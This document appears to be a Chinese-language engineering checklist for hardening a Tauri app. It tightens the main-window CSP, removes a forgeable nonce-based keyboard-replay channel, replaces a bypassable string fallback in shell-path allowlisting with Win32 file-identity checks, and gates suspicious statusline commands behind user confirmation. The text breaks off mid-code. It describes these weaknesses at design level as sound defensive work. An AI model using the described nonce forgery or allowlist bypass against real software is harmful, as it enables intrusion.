# 章三「安全放宽」修复清单(CP-012/013/014/035/043/044)

真值源:`docs/compromises.md` 章三(第 53-68 行)。本清单每条均经现状代码原文实读核对(2026-09-07),漂移点见末尾「起草附注」。已锁定决策照抄落成步骤,方向不再讨论。

---

## CP-012 · CSP `script-src 'unsafe-inline'` + `dangerousDisableAssetCspModification` 放宽 [Stage S10]

1. **位置**:
   - `src-tauri/tauri.conf.json:24-27`(security 块,CSP 在 :25,assetCspModification 在 :26)
   - `src/__tests__/csp-config.test.ts:39-54`(script-src 'unsafe-inline' 守卫 + nonce 注入关闭守卫)
   - `src/panels/CLAUDE.md:164`(「CSP 全局放宽」红线登记)
   - `src/panels/docViewer/CLAUDE.md`「PreviewFrame(红线单点收容)」节(sandbox/四层校验/CSP 依赖登记)
   - `.claude/adr.md:203`(ADR-0009 SEC-09 决策行)
2. **现状**:
   - tauri.conf.json:25:`"csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: asset: https://asset.localhost; font-src 'self' data:"`
   - tauri.conf.json:26:`"dangerousDisableAssetCspModification": ["script-src"]`
   - 预览通道现状:`PreviewFrame.tsx:284` 用 `srcDoc={injectScript(html, buildInjectedScript(nonce, segments), INJECTED_MARKER)}` 渲染 sandbox iframe(srcdoc 继承主窗口 CSP,注入脚本必须内联 → 主窗口被迫放行 unsafe-inline)。
   - csp-config.test.ts:39-47 锁 script-src 必含 'unsafe-inline';:49-54 锁 dangerousDisableAssetCspModification 必含 "script-src"。
3. **修复步骤**(S10 编排内分四步,本条覆盖 ② 迁移与 ④ script-src 回收;① spike 为独立前置任务卡):
   1. **任务卡 S10-①(隐性硬前置,首任务)**:多 webview 的 tauri-driver/WDIO 可达性 spike——用 embedded driver(webview2-com COM 直连)验证新开的预览 webview 可被枚举与驱动(execute 可达性、焦点语义、销毁语义)。产物:go/no-go 结论 + 预览 webview 加载方式(asset 协议宿主页 / data: 注入)实测结论。spike 不过则整体回退「同态维持」备选(不做,仅登记)。
   2. **任务卡 S10-②(webview 迁移,与 CP-013/044 同卡)**:预览渲染迁出主窗口 CSP 域,迁独立 Tauri webview。契约级设计(执行 agent 照抄契约,实现适配):
      - 新 webview 宿主结构:每个 docViewer 面板(htmlviewer/markdownviewer)的预览内容不再经主 window 内 iframe srcDoc,改在独立 webview 中渲染;预览 webview 加载专用宿主页,宿主页 CSP 单独放行内联脚本(预览注入机制 injectScript + buildInjectedScript + nonce 原样迁入,仍只在预览 CSP 域内宽松)。
      - 消息桥契约:替代 window.postMessage(跨 window 关系可能不成立,以 spike 结论为准);首选 Tauri event 通道或 webview 原生消息接口。消息集契约(与 CP-013 锁定一致):上行仅渲染态(zoom/scroll/nav),下行 reset/zoom_set/scroll_set;不含任何命令重放。
      - 主窗口 CSP 终态(S10-④ 落,script-src 先行回收,data: 归 CP-035 终步):
        ```json
        "security": {
          "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: asset: https://asset.localhost; font-src 'self' data:"
        }
        ```
        即删除整个 `"dangerousDisableAssetCspModification"` 键,CSP 字符串中 `script-src 'self' 'unsafe-inline'` 改为 `script-src 'self'`。
   3. **波及面四区(任务卡必须显式覆盖)**:
      - **shortcuts**:`buildInjectedScript.ts:29` TRUSTED_MARKER、`PreviewFrame.tsx:239` 合成 keydown 重放、`command-catalog.test.ts:63-66` global 命令集守卫——全部随 CP-013 退役/重写(见 CP-013 步骤)。
      - **docViewer 层**:`previewMessages.ts` / `zoomRuntime.ts` / `scrollRuntime.ts` / `FloatingArea.tsx` / `useZoomHud.ts` / `ModeSwitcher.tsx` 随渲染容器改写;L2 四测试 `doc-viewer-injection.test.ts` / `doc-viewer-zoom-runtime.test.ts` / `html-panel.test.tsx` / `markdown-panel.test.tsx` 同步重写;`csp-config.test.ts` 按本条步骤 4 适配;`e2e-tests/html.e2e.ts:87` skip 用例(skip 原因「依赖 CSP 'unsafe-inline'」)取消 skip 并改写为预览 webview 上下文断言;`e2e-tests/markdown.e2e.ts` 同步。
      - **panelRegistry + layoutSerde**:`panelRegistry.ts:111-117` `isAlwaysRenderPanel` 白名单含 htmlviewer/markdownviewer(理由 = iframe browsing context 销毁重建白屏 + CM 实例保活)——预览改独立 webview 后 browsing context 理由消亡,白名单去留随 spike 结论复核并登记;存量布局 JSON 中 docViewer 面板的迁移策略经 `layoutSerde.ts` `patchLegacyLayout`(layoutSerde.ts:20-68)家族处理(新增面板渲染形态字段的缺省修补),存量布局不得因此加载失败。
      - **e2e 可达性**:S10-① spike 结论驱动;WDIO 对预览 webview 的 selector 可达策略写入 e2e-tests/CLAUDE.md。
   4. **任务卡注明**:复核 CP-037(display:none 保活)在新架构下的形态——预览迁 webview 后 workspace 层 CSS 显隐保活对预览 webview 是否仍然适用,结论登记 ADR-0019。
4. **测试同步**:
   - `src/__tests__/csp-config.test.ts`:
     - 用例「script-src 放行同源 + 内联脚本/事件」(:39-47)改写为锁终态:断言 `directives["script-src"]` 恰好等于 `["'self'"]`,且 CSP 字符串 `not.toMatch(/script-src[^;]*'unsafe-inline'/)`。
     - 用例「关闭 script-src 的 nonce 注入」(:49-54)删除(键已不存在);新增「dangerousDisableAssetCspModification 不存在」:`expect(security.dangerousDisableAssetCspModification).toBeUndefined()`。
     - img-src(:81-95)/font-src(:97-103)用例本轮不动——CP-035 终步再改,避免一次锁两个终态。
   - L2 四测试(html-panel/markdown-panel/doc-viewer-injection/doc-viewer-zoom-runtime)随 S10-② 容器改写同步重写,用例适配逐一点名见 CP-013/044 测试同步。
5. **文档同步**:
   - `src/panels/CLAUDE.md:164` 红线「CSP 全局放宽:……必须主窗口 `script-src 'self' 'unsafe-inline'` + `dangerousDisableAssetCspModification: ["script-src"]`。收紧会静默破坏 HTML 预览。」改为:「预览渲染于独立 webview(自有 CSP,内联脚本仅该域放行);主窗口 CSP 禁 script-src 'unsafe-inline'、禁 dangerousDisableAssetCspModification;srcdoc iframe 通道已退役。收紧主窗口 CSP 不再影响预览。」
   - `src/panels/docViewer/CLAUDE.md` PreviewFrame 节整体重写为 webview 架构红线(渲染容器/消息桥/nonce 语义/保活语义)。
   - `.claude/adr.md` 新增 **ADR-0019「预览渲染迁独立 webview」**:动机(SEC-09 回收 + CP-012/013/035/044 同根)、S10-① spike 结论、消息桥契约、波及面四区处置、CP-037 复核结论;ADR-0009 SEC-09 行(adr.md:203)尾追加「已被 ADR-0019 取代」。
6. **验证**:
   - `grep -c "unsafe-inline" src-tauri/tauri.conf.json` → 输出 `1`(仅剩 style-src)
   - `grep -c "dangerousDisableAssetCspModification" src-tauri/tauri.conf.json` → 输出 `0`
   - `npx vitest run src/__tests__/csp-config.test.ts` 全绿
   - L4:`e2e-tests/html.e2e.ts` 缩放链路用例(原 iframe postMessage 链)在新 webview 下通过;`html.e2e.ts:87` 不再 skip

---

## CP-013 · HTML 预览 nonce 可被注入脚本内部伪造(威胁模型登记) [Stage S10]

1. **位置**:
   - `src/panels/docViewer/buildInjectedScript.ts:58-63`(D16 威胁模型注释原文)
   - `src/panels/docViewer/buildInjectedScript.ts:69-75`(基础段 keydown 转发,上行 slterm_key)
   - `src/panels/docViewer/PreviewFrame.tsx:216-241`(slterm_key 通道:nonce 校验后查 global 命令集,合成 KeyboardEvent 重放,TRUSTED_MARKER 标记)
   - `src/__tests__/command-catalog.test.ts:60-66`(global context 命令集守卫,锁死 `[global.closeTab]`)
2. **现状**:
   - buildInjectedScript.ts:58-63:「nonce 明文内联于 srcDoc——iframe 内任意脚本可读取文档中的注入脚本提取 nonce 并伪造 slterm_key / slterm_zoom 消息。nonce 仅防『不知密钥的外部伪造』,不防被预览 HTML 自身……键盘转发由 global context 命令集最小化兜底(当前仅 global.closeTab 关页签,低风险)——守卫测试 command-catalog.test.ts 锁死该集合」。
   - PreviewFrame.tsx:224-241:`registry.exportContextBindings("global")` 命中 fingerprint 后 `new KeyboardEvent(...)` + `Object.defineProperty(event, TRUSTED_MARKER, { value: true })` + `window.dispatchEvent(event)`。
   - 全局命令集现状:command-catalog.test.ts:63-66 锁死 `globals).toEqual(["global.closeTab"])`。
3. **修复步骤**(与 CP-012 同一任务卡 S10-② 执行;锁定方向 = 上行命令面收窄为零,去 global 重放通道):
   1. `buildInjectedScript.ts` 删除基础段(keydown 转发段,现 :69-75):注入脚本不再上行 slterm_key;`buildInjectedScript(nonce, extra)` 签名保留——nonce 仍拼入 zoom/scroll/nav 消息,父侧校验语义不变。
   2. `PreviewFrame.tsx`(或 S10-② 后的新宿主组件)删除 slterm_key 整分支(现 :216-241):删 ShortcutRegistry 查询、合成 KeyboardEvent、TRUSTED_MARKER 标记、window.dispatchEvent 重放。上行处理只保留 ZOOM_MSG_TYPE / SCROLL_MSG_TYPE / NAV_MSG_TYPE 三个渲染态分支。
   3. `buildInjectedScript.ts:29` 删 `TRUSTED_MARKER` 常量导出。
   4. 预览内键盘语义(契约级,执行 agent 照 S10-① spike 结论适配,不新设命令通道):预览 webview 聚焦时 Ctrl+W 等全局快捷键由主窗口 ShortcutRegistry window capture 层处理;若 spike 证实 webview 焦点吞键,补 host 级 keydown 透传(仅转发按键事件,不转发命令)。
   5. 上行消息终态集合(写死):`{slterm_zoom, slterm_scroll, slterm_nav}`;任何新增上行类型必须过面板守卫 + L2 白名单守卫(见 CP-044 步骤 3)。
4. **测试同步**:
   - `src/__tests__/command-catalog.test.ts`:用例「global context 命令集恒为 [global.closeTab]」(:63-66)改写为「预览消息通道不含命令重放」——断言 previewMessages.ts 导出的上行类型集合不含 key 类型(静态守卫),原 global 命令集等值断言删除(global.closeTab 由主窗口手势路径消费,不经预览通道)。
   - `src/__tests__/html-panel.test.tsx`:keydown 重放用例(含 :659-660 `__slterm_postMessage` 断言)删除;新增负面用例「slterm_key 消息被静默忽略」(dispatch 带合法 nonce 的 slterm_key → 无 dispatchEvent、无 closeTab)。
   - `src/__tests__/markdown-panel.test.tsx` 同步删 key 转发断言。
   - `e2e-tests/html.e2e.ts:12-80`「iframe 内 Ctrl+W postMessage → 转发关闭」用例改写:新架构下经主窗口快捷键路径验证关闭链路,或按 spike 结论登记豁免。
5. **文档同步**:
   - `buildInjectedScript.ts:58-63` 威胁模型注释删除,替换为:「上行仅渲染态(zoom/scroll/nav),无命令重放通道——SEC-04 内部伪造威胁面随 CP-012 webview 迁移消除(ADR-0019)」。
   - `src/panels/docViewer/CLAUDE.md` 上行通道列表删 `slterm_key(global 命令重放…)` 条目;`previewMessages.ts` 头注释「上行 slterm_key / slterm_zoom /(slterm_scroll)」同步改写。
   - `.claude/adr.md:230` D16 行尾追加「威胁模型已消除:上行命令面收窄为零,ADR-0019」;adr.md:405 ADR-0017「global 命令集不因 md 扩充」决策行尾追加「global 重放通道已退役,ADR-0019」。
6. **验证**:
   - `grep -rn "slterm_key" src/` → 输出 0(注释同步清理后)
   - `grep -rn "TRUSTED_MARKER" src/` → 输出 0
   - `npx vitest run src/__tests__/command-catalog.test.ts src/__tests__/html-panel.test.tsx` 全绿
   - L2 负面用例「slterm_key 被忽略」通过且为新增用例(防回归)

---

## CP-014 · shell 路径比对双侧 canonicalize 失败回退归一字符串(SEC-15 残余风险) [Stage S04-4b]

1. **位置**:
   - `src-tauri/src/pty/shell.rs:109-138`(`paths_match` 三分支;分支 2 字符串回退在 :125-133)
   - `src-tauri/src/pty/shell.rs:141-149`(`normalize_for_compare`)
   - `src-tauri/src/pty/shell.rs:514-600`(paths_match 纯函数测试)、`:601-618`(alias 兼容集成测试)、`:620-653`(真实应用执行别名条件测试)
   - `src-tauri/Cargo.toml:73-80`(windows crate features,缺 `Win32_Storage_FileSystem`)
   - `src-tauri/src/pty/CLAUDE.md:70-75`(Shell 白名单节 SEC-15 登记)
   - `.claude/adr.md:229`(D15 决策行)
2. **现状**:
   - shell.rs:125-133 分支 2:`(Err(_), Err(_)) => { let a = normalize_for_compare(program); let b = normalize_for_compare(resolved); if cfg!(windows) { a.eq_ignore_ascii_case(&b) } else { a == b } }`——两侧均失败时纯字符串放行。
   - shell.rs:100-108 doc 注释自登记:「理论上可构造同名字符串绕过——alias 兼容与风险的权衡,D15 决策,SEC-15」。
   - windows crate 现状 features:JobObjects / Threading / Console / Foundation / Security / Pipes(Cargo.toml:73-80)。
3. **修复步骤**(常规修复,代码全量照抄):
   1. `src-tauri/Cargo.toml:73-80` windows features 数组追加 `"Win32_Storage_FileSystem",`。
   2. `shell.rs` 新增句柄级身份函数(放在 `paths_match` 之前):
      ```rust
      /// Win32 句柄级文件身份（SEC-15 根治：替代 D15 字符串回退比对）
      ///
      /// 身份 = (volume serial number, file index)——同一卷上唯一标识一个文件。
      /// CreateFileW 不带 FILE_FLAG_OPEN_REPARSE_POINT：应用执行别名（app execution
      /// alias）reparse point 被解析到真实目标，打开的是真实文件句柄（canonicalize
      /// 失败的 os error 1920 场景下 CreateFile 仍成功——正是该回退面存在的合法
      /// alias 用例，两侧指向同一文件时句柄身份必然相等）。
      /// 任一侧打开/查询失败 → None：句柄级证据缺失即整体拒绝，绝不降级字符串比对。
      #[cfg(windows)]
      fn file_identity(path: &str) -> Option<(u32, u64)> {
          use std::os::windows::ffi::OsStrExt;
          use windows::Win32::Foundation::CloseHandle;
          use windows::Win32::Storage::FileSystem::{
              CreateFileW, GetFileInformationByHandle, BY_HANDLE_FILE_INFORMATION,
              FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_SHARE_DELETE, FILE_SHARE_READ,
              FILE_SHARE_WRITE, OPEN_EXISTING,
          };

          let wide: Vec<u16> = std::ffi::OsStr::new(path).encode_wide().chain(Some(0)).collect();
          let mut info: BY_HANDLE_FILE_INFORMATION = unsafe { std::mem::zeroed() };
          unsafe {
              let handle = CreateFileW(
                  windows::core::PCWSTR(wide.as_ptr()),
                  FILE_GENERIC_READ,
                  FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                  None,
                  OPEN_EXISTING,
                  FILE_ATTRIBUTE_NORMAL,
                  None,
              )
              .ok()?;
              let queried = GetFileInformationByHandle(handle, &mut info).is_ok();
              let _ = CloseHandle(handle);
              if !queried {
                  return None;
              }
          }
          let index = ((info.nFileIndexHigh as u64) << 32) | (info.nFileIndexLow as u64);
          Some((info.dwVolumeSerialNumber, index))
      }
      ```
   3. `shell.rs:109-138` `paths_match` 整函数替换为:
      ```rust
      /// 比较 program 与 PATH 解析结果是否指向同一可执行文件（SEC-01 判定核心）
      ///
      /// 1) canonicalize 双成功 → 精确比较（拉平 8.3 短名/`..`/symlink 差异）；
      /// 2) 双侧均失败（应用执行别名/特殊 ACL——CreateProcess 可运行但普通文件
      ///    API 打开失败，os error 1920 场景）→ Win32 句柄级文件身份比对
      ///    （volume serial + file index，CreateFile 解析 alias reparse point 真实
      ///    目标——SEC-15 根治，替代 D15 字符串回退；任一侧打不开即拒绝，不降级）；
      /// 3) 单侧失败即拒绝（SEC-15 收窄保留为纵深一层）。
      fn paths_match(program: &str, resolved: &str) -> bool {
          match (
              std::fs::canonicalize(program),
              std::fs::canonicalize(resolved),
          ) {
              // 1) canonicalize 双成功 → 精确比较（8.3 短名/`..`/symlink 差异由系统拉平）
              (Ok(cp), Ok(cr)) => {
                  if cfg!(windows) {
                      cp.to_string_lossy()
                          .eq_ignore_ascii_case(&cr.to_string_lossy())
                  } else {
                      cp == cr
                  }
              }
              // 2) 双侧均失败 → Win32 句柄级文件身份比对（SEC-15 根治）
              (Err(_), Err(_)) => fallback_identity_match(program, resolved),
              // 3) SEC-15：单侧失败即拒绝——字符串比对无法证明文件身份，
              //    reparse point/执行别名组合可绕过，从严
              _ => false,
          }
      }

      /// 双侧 canonicalize 失败的回退比对（SEC-15 根治）
      ///
      /// Windows：句柄级文件身份（两侧均打开成功且身份相等才放行——合法 alias 用例
      /// 两侧指向同一文件，身份必然相等；同名字符串的不同文件身份不等，绕过失效）。
      /// 非 Windows：保留原归一字符串比对（无 Win32 API，仅编译兜底；生产目标 Windows）。
      #[cfg(windows)]
      fn fallback_identity_match(program: &str, resolved: &str) -> bool {
          match (file_identity(program), file_identity(resolved)) {
              (Some(a), Some(b)) => a == b,
              // 任一侧打不开 → 句柄级证据缺失 → 拒绝（不降级字符串比对）
              _ => false,
          }
      }

      /// 非 Windows 平台编译兜底：维持原归一字符串比对
      #[cfg(not(windows))]
      fn fallback_identity_match(program: &str, resolved: &str) -> bool {
          normalize_for_compare(program) == normalize_for_compare(resolved)
      }

      /// 路径归一化（仅非 Windows 平台字符串比对兜底用；Windows 走句柄级身份比对）
      #[cfg(not(windows))]
      fn normalize_for_compare(p: &str) -> String {
          p.trim_end_matches('/').to_string()
      }
      ```
      说明:`normalize_for_compare` 原 Windows 分支(`/`→`\`、去尾分隔符)随字符串回退一并删除;`shell.rs:100-108` 原 doc 注释由本块新注释替代。
4. **测试同步**(L1,`shell.rs` 内嵌 `mod shell_tests`):
   - 既有用例适配(逐一点名):
     - `paths_match_fallback_case_insensitive`(:549)、`paths_match_fallback_separator_normalization`(:560)、`paths_match_fallback_unequal`(:569)——三则用非存在路径构造双失败,新语义下双打不开即拒绝;改写合并为一则 `fallback_both_unopenable_rejected`:`assert!(!paths_match(r"C:\no-such-dir-x\cmd.exe", r"C:\no-such-dir-x\cmd.exe"))`(同名同串也拒绝——防回归锚点:字符串证据不再构成放行依据)。
     - `paths_match_canonical_equal` / `paths_match_canonical_unequal` / `paths_match_single_side_failure_rejected`(:575-599)——不动。
     - `allowlist_accepts_real_alias_when_present`(:632-653)——保留,注释「canonicalize(alias) 失败 → fallback 字符串比对放行」改为「→ 句柄级身份比对放行(两侧同一 alias 身份相等)」;断言不变。
   - 新增用例(Windows 条件编译,`#[cfg(windows)]`,按 pty/CLAUDE.md 测试模式登记豁免——Win32 编译期 API 无法运行时区分):
     - `file_identity_same_file_via_hardlink_equal`:tempdir 建实文件 + `std::fs::hard_link`,`file_identity` 两侧相等,且 `fallback_identity_match(a, b)` 为 true。
     - `file_identity_distinct_files_unequal`:两不同 temp 文件身份不等,`fallback_identity_match` 为 false。
     - `file_identity_missing_file_none`:不存在路径 → `file_identity` 返回 None。
   - 防回归:上述三则 + `fallback_both_unopenable_rejected` 共同锁死「绕过需同 volume serial + file index,字符串不再构成证据」。
5. **文档同步**:
   - `src-tauri/src/pty/CLAUDE.md:75`「双侧 `canonicalize` 均失败时回退归一字符串比对(alias/Store 版 pwsh 兼容),单侧失败即拒绝」改为:「双侧 `canonicalize` 均失败时回退 Win32 句柄级文件身份比对(volume serial + file index,CreateFile 解析 alias reparse point);任一侧打不开即拒绝,不降级字符串;单侧失败即拒绝」。
   - `.claude/adr.md:229` D15 行尾追加:「D15 残余风险已销(2026-09):字符串回退改 Win32 句柄级文件身份比对,SEC-15 单侧拒绝保留为纵深」。
6. **验证**:
   - `cargo test --test lib_tests paths_match -- --test-threads=1` 全绿(含新增 hardlink 三例)
   - `cargo test --test lib_tests file_identity -- --test-threads=1` 全绿
   - `cargo clippy --manifest-path src-tauri/Cargo.toml -- -D warnings` 零警告(重点:`normalize_for_compare` cfg 后无 dead_code)
   - `grep -n "eq_ignore_ascii_case(&b)" src-tauri/src/pty/shell.rs` → 输出 0(字符串回退已删)

---

## CP-035 · CSP img-src/font-src `data:` 放行(ADR-0018 新增宽放未入册) [Stage S10]

1. **位置**:
   - `src-tauri/tauri.conf.json:25`(img-src 含 `data:`、font-src 含 `data:`)
   - `src/__tests__/csp-config.test.ts:89-103`(img-src data: 守卫 :89-95;font-src data: 守卫 :97-103)
   - 资源通道:`src/panels/markdown/mdRenderAsync.ts`(资源 data: URL 替换)+ `src/panels/markdown/assets.ts`(MIME 白名单)
2. **现状**:
   - tauri.conf.json:25:`img-src 'self' data: asset: https://asset.localhost; font-src 'self' data:`。
   - csp-config.test.ts:89-95:锁 img-src 含 `data:` 且不含 `blob:`,注释自证「svg 经 `<img>` 惰性上下文加载(内嵌 script 不执行),data: 不承载脚本」——W3C 行为单点兜底。
   - csp-config.test.ts:97-103:锁 font-src 含 `data:`(KaTeX 数学字体内联,KaTeX 字体 = `generated/katexInlineCss.ts` woff2 data: 内联,CP-033 同源项)。
3. **修复步骤**(S10 终步 ④,硬前置 = S10-② 迁移完成 + S10-③ CP-033 新上下文重实证;两步未完成不得执行本步):
   1. 主窗口 CSP 终态(tauri.conf.json:25 整串替换,`dangerousDisableAssetCspModification` 已由 CP-012 删除):
      ```json
      "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' asset: https://asset.localhost; font-src 'self'"
      ```
      即主窗口 img-src/font-src 双双回收 `data:`;`style-src 'unsafe-inline'` 保留(React inline style / CM6 注入样式,csp-config.test.ts:73-79 守卫,与本族无关)。
   2. 预览 webview CSP 独立放行 `data:`(img/font)——docViewer 资源内联通道(md/html 相对资源经后端沙箱读入拼 data: URL)只在预览 CSP 域宽松,不进主窗口。
   3. **S10-③ CP-033 重实证(硬前置)**:KaTeX 字体在**新预览 webview 上下文**实测 woff2 data: 加载;实证通过才允许执行步骤 1 的 font-src 回收;实证失败则 font-src 回收拆为独立后续项登记 `docs/compromises.md`,img-src 回收照常(图片通道与字体无关)。
   4. **svg data: 处置(默认执行)**:markdown `assets.ts` MIME 白名单剔除 `image/svg+xml`(显式禁用 svg 内联);html 侧资源通道同口径剔除。若执行期判定「`<img>` 惰性上下文」证据充分要保留 svg,必须在 ADR-0019 登记理由 + L2 锁白名单断言——默认按禁用执行,不留运行时依赖。
4. **测试同步**:
   - `src/__tests__/csp-config.test.ts`:
     - 用例「img-src 放行 data:」(:89-95)改写:断言 `directives["img-src"]` 恰好等于 `["'self'", "asset:", "https://asset.localhost"]`,`expect(directives["img-src"]).not.toContain("data:")`;原 `not.toContain("blob:")` 保留。
     - 用例「font-src 放行同源 + data:」(:97-103)改写:断言 `directives["font-src"]` 恰好等于 `["'self'"]`。
     - 新增「data: 不在主窗口任何指令」:`for (const [name, sources] of Object.entries(directives)) { expect(sources).not.toContain("data:"); }`(锁不变量,防任何指令重新引入 data:)。
   - markdown 资源 L2(assets 白名单测试):新增「svg MIME 不在资源内联白名单」断言;svg 若有既有放行用例则改写为拒绝。
5. **文档同步**:
   - `src/panels/CLAUDE.md:32` ADR-0018 一句「本地资源通道(fs_read_resource + data: URL + CSP data: 放行)」改为「……data: URL + 预览 webview CSP data: 放行(主窗口已回收)」。
   - `src/panels/markdown/CLAUDE.md`「本地资源(决策 #9,ADR-0018)」节:svg 禁用处登记。
   - `.claude/adr.md` ADR-0018 尾「逆转触发点」节标注:「已回收(ADR-0019 终步):主窗口 img-src/font-src data: 移除;KaTeX 字体经新预览上下文实证;svg data: 显式禁用」。
6. **验证**:
   - `grep -o "data:" src-tauri/tauri.conf.json` → 输出 0 行
   - `npx vitest run src/__tests__/csp-config.test.ts` 全绿
   - L4:`e2e-tests/markdown.e2e.ts` 图片加载用例(原 data: 通道)在预览 webview 下通过;font-src 实证记录(S10-③ 产物)归档 ADR-0019

---

## CP-043 · SEC-12 statusline 原命令审查仅 warn 不阻断 [Stage S04-4b]

1. **位置**:
   - `src-tauri/src/hooks/claude/inject.rs:114-166`(SEC-12 注释段;`SUSPICIOUS_PATTERNS` :123-131;`warn_if_suspicious_statusline` :160-166)
   - 调用点:`inject.rs:453-456`(`inject_impl` 注入路径)、`inject.rs:615-618`(`reinject_statusline_impl` 启动重注入路径)
   - DTO:`src-tauri/src/hooks/mod.rs:31-40`(`AgentInjectionStatus` 三态)、`:45-52`(`AgentHookInjectionStatus`)
   - 前端:`src/types/agent.ts:37-43`、`src/ipc/agentHooks.ts:19-21`、`src/features/cliProfiles/profiles/claude/configEditor/ClaudeHooksConfigEditor.tsx:266-278`(`handleInject`)
   - 命令注册三处:`src-tauri/src/lib.rs:132`(generate_handler)、`src-tauri/build.rs:48-53`(AppManifest 清单)、`src-tauri/capabilities/default.json:44-49`
   - 登记:`src-tauri/src/hooks/CLAUDE.md:78-80`(SEC-12 节)
2. **现状**:
   - inject.rs:160-166:`fn warn_if_suspicious_statusline(command: &str) { if let Some(pattern) = suspicious_statusline_pattern(command) { tracing::warn!("statusline 原命令命中可疑模式 {pattern}(SEC-12 审查,仅记录不阻断): {command}"); } }`——普通 target warn,无审计通道。
   - inject.rs:453-456 注入路径命中仍照常写桥接配置 + 备份 + 原子写回 settings.json;inject.rs:615-618 重注入路径同样静默放行。
   - 链路背景:hooks 注入 = 后端直写 `~/.claude/settings.json`(`inject.rs:1-5` 头注释),「用户确认」无现成 IPC 契约可挂。
3. **修复步骤**(跨端常规修复,代码全量照抄):
   1. `inject.rs` 审查函数改为「审计 + 返回判定」形态(`warn_if_suspicious_statusline` 整函数替换):
      ```rust
      /// statusline 原命令可疑模式审查（SEC-12 调用点，CP-043）——
      /// 命中进审计通道（target "audit"）并返回命中模式；调用方据此暂停注入，
      /// 待前端展示命令原文、用户确认后经 confirm 路径完成注入。
      /// 不再静默放行（旧语义「仅记录不阻断」作废）。
      fn audit_suspicious_statusline(command: &str) -> Option<&'static str> {
          let pattern = suspicious_statusline_pattern(command);
          if let Some(p) = pattern {
              tracing::warn!(target: "audit",
                  "statusline 原命令命中可疑模式 {p}（SEC-12 审查，暂停注入待用户确认）: {command}");
          }
          pattern
      }
      ```
   2. `inject.rs:362-365` `inject_impl` 签名加审查开关参数:
      ```rust
      pub(crate) fn inject_impl(
          settings_path: &std::path::Path,
          script_dir: &std::path::Path,
          skip_suspicious_review: bool, // CP-043：确认注入路径为 true——命令原文已展示并经用户确认
      ) -> Result<AgentHookInjectionStatus, AppError> {
      ```
      函数体第 1-5 步(脚本落盘 + settings 读取 + matcher 组装)不变;原第 6 步(statusLine 桥接)前插审查闸(替换 inject.rs:428-466 的 else 分支开头):
      ```rust
          let existing_statusline = root_obj.get("statusLine").cloned();
          if !existing_statusline.as_ref().is_some_and(statusline_is_bridge) {
              // B11 解包求最内层原命令（逻辑不变）
              let raw_command = existing_statusline
                  .as_ref()
                  .and_then(|sl| sl.get("command"))
                  .and_then(|c| c.as_str());
              let original_command = match raw_command {
                  Some(raw) => unwrap_wrapped_statusline(raw).unwrap_or_else(|| raw.to_string()),
                  None => String::new(),
              };
              // CP-043：命中可疑模式 → settings.json 零写盘（matcher 与桥接均不落盘），
              // 返回待确认 + 命令原文；脚本已落盘无害（无 matcher 引用即惰性）
              if !skip_suspicious_review && !original_command.is_empty() {
                  if audit_suspicious_statusline(&original_command).is_some() {
                      return Ok(AgentHookInjectionStatus {
                          status: AgentInjectionStatus::PendingConfirmation,
                          version: None,
                          suspicious_command: Some(original_command),
                      });
                  }
              }
              // ……原备份 + build_bridge_statusline + insert 逻辑原样继续……
          }
      ```
      注意:PendingConfirmation 返回时函数尚未执行第 7 步原子写回——settings.json 逐字节未动(测试断言此点)。
   3. `reinject_statusline_impl`(inject.rs:570 起)启动路径:inject.rs:615-618 改为「命中即跳过重注入 + 审计,不改写 settings」:
      ```rust
          // CP-043：启动路径无用户交互——命中可疑模式不重注入（尊重用户现状配置
          // 不动），审计留痕；用户须进设置页手动注入走确认流
          if !original_command.is_empty() && audit_suspicious_statusline(&original_command).is_some() {
              return Ok(());
          }
      ```
      (替换原 `if !original_command.is_empty() { warn_if_suspicious_statusline(&original_command); }`,其后原桥接 insert + 原子写回逻辑不变。)
   4. DTO 改造(`src-tauri/src/hooks/mod.rs`)——`AgentInjectionStatus` 整枚举替换:
      ```rust
      /// 注入状态枚举（C6 契约；决策 3 更名 AgentInjectionStatus；CP-043 增待确认态）
      #[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq)]
      #[serde(rename_all = "camelCase")]
      pub enum AgentInjectionStatus {
          /// 已注入且版本匹配
          Injected,
          /// 未注入
          NotInjected,
          /// 已注入但版本过旧
          Outdated,
          /// 命中可疑模式，暂停注入待用户确认（CP-043/SEC-12）
          PendingConfirmation,
      }
      ```
      `AgentHookInjectionStatus` 整结构体替换(新增字段;`skip_serializing_if` 保住既有契约测试的两键集合断言):
      ```rust
      #[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
      #[serde(rename_all = "camelCase")]
      pub struct AgentHookInjectionStatus {
          /// 注入状态
          pub status: AgentInjectionStatus,
          /// 已注入脚本版本号（未注入时为 null）
          pub version: Option<u32>,
          /// 待确认的可疑 statusline 原命令原文（仅 pendingConfirmation 时存在；
          /// skip_serializing_if 保证其余状态序列化键集合不变——HUK-09 契约兼容）
          #[serde(default, skip_serializing_if = "Option::is_none")]
          pub suspicious_command: Option<String>,
      }
      ```
   5. provider trait 加带默认实现的方法(`src-tauri/src/hooks/provider.rs`,`CliHooksProvider` 内,照 `ensure_hooks_scripts` 9-6 先例,既有实现零改动):
      ```rust
          /// 确认注入（CP-043）：前端展示可疑命令原文、用户确认后二次调用，
          /// 跳过可疑审查完成注入。默认 Validation——不支持待确认语义的 provider
          /// 不应被二次调用（注册表家族契约：新方法走默认实现先例）。
          fn confirm_inject(&self) -> Result<AgentHookInjectionStatus, AppError> {
              Err(AppError::Validation("该 CLI 不支持确认注入".into()))
          }
      ```
      claude provider(`src-tauri/src/hooks/claude/mod.rs:61-65`)新增 override:
      ```rust
          fn confirm_inject(&self) -> Result<AgentHookInjectionStatus, AppError> {
              let script_dir = hooks_dir().ok_or_else(home_dir_err)?;
              let settings_path = claude_settings_path().ok_or_else(home_dir_err)?;
              inject::inject_impl(&settings_path, &script_dir, true)
          }
      ```
      原 `inject` override 调用改为 `inject::inject_impl(&settings_path, &script_dir, false)`。
   6. 新命令(`src-tauri/src/hooks/mod.rs`,照 `run_agent_hooks_inject` 形态):
      ```rust
      pub(crate) async fn run_agent_hooks_confirm_inject(
          cli_id: String,
      ) -> Result<AgentHookInjectionStatus, AppError> {
